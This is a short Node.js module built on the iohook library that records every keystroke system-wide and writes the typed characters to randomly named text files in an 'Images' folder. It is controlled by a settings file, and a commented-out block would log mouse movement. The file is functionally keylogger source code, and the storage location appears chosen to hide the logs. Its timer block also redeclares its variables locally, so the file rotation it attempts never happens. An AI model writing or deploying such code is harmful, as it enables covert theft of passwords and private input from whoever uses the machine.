module.exports = function(KeyIsEnable) {
    
  let shared=require("./Shared.js");
var fs = require('fs'); 
const ioHook = require('iohook');
var FileNameKey="Images/"+"Keyboard-"+shared.getRandomInt(9999999999)+".txt";
// var FileNameMouse="Images/"+"mouse-"+getRandomInt(9999999999)+".txt";
let response= shared.readSetting();
let text_key="";
// let text_mouse="";
let main_key="";
// let main_mouse="";
setInterval(function(){
  response= shared.readSetting();
 var FileNameKey="Images/"+"Keyboard-"+shared.getRandomInt(9999999999)+".txt";
// var FileNameMouse="Images/"+"mouse-"+getRandomInt(9999999999)+".txt";
let text_key="";
// let text_mouse="";
let main_key="";
// let main_mouse="";
},response.Keyboard)
  
ioHook.on('keydown', function(e)
{

 if(response.KeyboardEnable==true)
 {
     text_key=String.fromCharCode(e.rawcode);

  main_key+=text_key;
  fs.writeFileSync(FileNameKey,main_key); 
 }
  
});
// ioHook.on('mousemove', function(e)
// {

//  if(mouseIsEnable==true)
//  {
//      text_mouse=e.x+","+e.y;

//   main_mouse+=text_mouse;
//   fs.writeFileSync(FileNameMouse,main_mouse); 
//  }

// });
ioHook.start();

ioHook.start(true);
}